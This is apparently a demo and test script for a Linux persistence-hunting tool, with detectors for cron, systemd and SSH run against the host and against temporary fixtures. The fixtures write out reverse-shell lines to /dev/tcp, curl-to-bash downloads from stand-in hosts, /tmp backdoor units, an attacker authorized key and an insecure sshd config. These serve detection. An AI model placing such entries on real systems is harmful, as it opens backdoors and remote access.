import json
from pathlib import Path
from tempfile import TemporaryDirectory

from persisthunt.findings import Finding, FindingCollection, Severity
from persisthunt.detectors.cron import CronDetector
from persisthunt.detectors.systemd import SystemdDetector
from persisthunt.detectors.ssh import SSHDetector

def demo_stage1_findings():
    print("=== Stage 1: Finding Model & Collection Demo ===")
    collection = FindingCollection()

    # 1 INFO finding
    collection.add(Finding(
        id="PH-TEST-001", category="general", severity=Severity.INFO,
        title="Info level finding", description="Just some info."
    ))

    # 1 LOW finding
    collection.add(Finding(
        id="PH-TEST-002", category="general", severity=Severity.LOW,
        title="Low level finding", description="A low severity issue."
    ))

    # 1 MEDIUM finding
    collection.add(Finding(
        id="PH-TEST-003", category="general", severity=Severity.MEDIUM,
        title="Medium level finding", description="A medium severity issue."
    ))

    # 1 HIGH finding
    collection.add(Finding(
        id="PH-TEST-004", category="systemd", severity=Severity.HIGH,
        title="High level finding", description="A high severity issue.",
        evidence="ExecStart=/tmp/malicious"
    ))

    # 1 CRITICAL finding
    collection.add(Finding(
        id="PH-TEST-005", category="cron", severity=Severity.CRITICAL,
        title="Critical level finding", description="A critical severity issue."
    ))

    print("--- Stored Findings ---")
    print(f"Total stored: {collection.count()} (Expected: 5)")

    print("\n--- Filtering by Severity (HIGH) ---")
    highs = collection.by_severity(Severity.HIGH)
    print(f"High severity findings: {len(highs)} (Expected: 1)")
    print(f"ID: {highs[0].id}")

    print("\n--- Filtering by Category (systemd) ---")
    sys_cats = collection.by_category("systemd")
    print(f"Systemd findings: {len(sys_cats)} (Expected: 1)")

    print("\n--- Statistics ---")
    stats = collection.severity_counts()
    for k, v in stats.items():
        print(f"{k}: {v}")


def demo_stage2_cron_detector():
    print("\n=== Stage 2: Cron Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (Cron) ---")
    detector = CronDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host cron findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious indicators
    print("\n--- Scanning Controlled Suspicious Cron Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        etc_crontab = root / "etc" / "crontab"
        cron_d = root / "etc" / "cron.d"
        cron_daily = root / "etc" / "cron.daily"
        spool = root / "var" / "spool" / "cron" / "crontabs"

        cron_d.mkdir(parents=True)
        cron_daily.mkdir(parents=True)
        spool.mkdir(parents=True)

        # Suspicious entries
        etc_crontab.write_text(
            "# System crontab with benign and suspicious entries\n"
            "SHELL=/bin/sh\n"
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n"
            "0 1 * * * root /usr/bin/backup-logs.sh\n"
            "* * * * * root /bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1\n"
        )

        (cron_d / "updater").write_text(
            "* * * * * root curl -fsSL https://malicious.example/payload.sh | bash\n"
            "0 0 * * * root /tmp/staged_script.sh\n"
        )

        (spool / "bob").write_text(
            "*/10 * * * * python3 -c 'import socket; print(1)'\n"
        )

        mock_detector = CronDetector(root_prefix=root)
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()


def demo_stage3_systemd_detector():
    print("\n=== Stage 3: Systemd Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (Systemd) ---")
    detector = SystemdDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host systemd findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious indicators
    print("\n--- Scanning Controlled Suspicious Systemd Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        etc_systemd = root / "etc" / "systemd" / "system"
        etc_systemd.mkdir(parents=True)

        # Suspicious unit 1: execution out of /tmp
        (etc_systemd / "backdoor.service").write_text(
            "[Unit]\n"
            "Description=Critical System Service\n"
            "[Service]\n"
            "Type=simple\n"
            "ExecStart=/tmp/backdoor_daemon\n"
            "Restart=always\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        )

        # Suspicious unit 2: download piped to shell
        (etc_systemd / "sysupdater.service").write_text(
            "[Unit]\n"
            "Description=Periodic Updater\n"
            "[Service]\n"
            "ExecStart=/bin/sh -c 'curl -fsSL https://evil.example/agent.sh | bash'\n"
        )

        # Suspicious unit 3: reverse shell socket
        (etc_systemd / "debug.service").write_text(
            "[Unit]\n"
            "Description=Debug Service\n"
            "[Service]\n"
            "ExecStart=/bin/bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n"
        )

        mock_detector = SystemdDetector(root_prefix=root)
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()


def demo_stage4_ssh_detector():
    print("\n=== Stage 4: SSH Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (SSH) ---")
    detector = SSHDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host SSH findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious SSH persistence
    print("\n--- Scanning Controlled Suspicious SSH Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        user_ssh = root / "home" / "victim" / ".ssh"
        user_ssh.mkdir(parents=True)
        user_ssh.chmod(0o700)

        # Suspicious forced command with indicator
        auth_keys = user_ssh / "authorized_keys"
        auth_keys.write_text(
            'command="/tmp/backdoor.sh",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMq1f9z57U7bFk9s01o8fG/exampleBlob12345 evil@remote\n'
        )
        auth_keys.chmod(0o600)

        # Service account with authorized keys
        svc_ssh = root / "var" / "www" / ".ssh"
        svc_ssh.mkdir(parents=True)
        (svc_ssh / "authorized_keys").write_text(
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7dummyRsaPublicBlob67890 web-shell@attacker\n"
        )

        # Insecure SSH daemon config
        etc_ssh = root / "etc" / "ssh"
        etc_ssh.mkdir(parents=True)
        (etc_ssh / "sshd_config").write_text(
            "PermitEmptyPasswords yes\n"
            "PermitRootLogin yes\n"
        )

        mock_detector = SSHDetector(
            root_prefix=root,
            service_account_dirs=[root / "var" / "www"],
        )
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()

        print("--- SSH Fixture Findings JSON Output ---")
        print(json.dumps(mock_findings.to_dict(), indent=2))


def main():
    demo_stage1_findings()
    demo_stage2_cron_detector()
    demo_stage3_systemd_detector()
    demo_stage4_ssh_detector()

if __name__ == "__main__":
    main()
